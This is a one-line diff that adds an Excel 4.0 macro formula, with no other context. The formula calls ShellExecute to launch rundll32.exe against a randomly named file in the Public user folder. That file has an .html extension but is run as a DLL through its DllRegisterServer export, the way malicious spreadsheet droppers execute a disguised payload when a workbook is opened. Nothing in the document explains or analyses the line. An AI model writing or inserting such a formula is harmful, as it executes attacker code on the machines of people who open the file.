@@ -1,0 +1,1 @@
+=CALL("Shell32","ShellExecute","JJCCCJJ",0,"open","C:\Windows\system32\rundll32.exe","c:\Users\Public\bmjn5ef.html,DllRegisterServer",0,5)
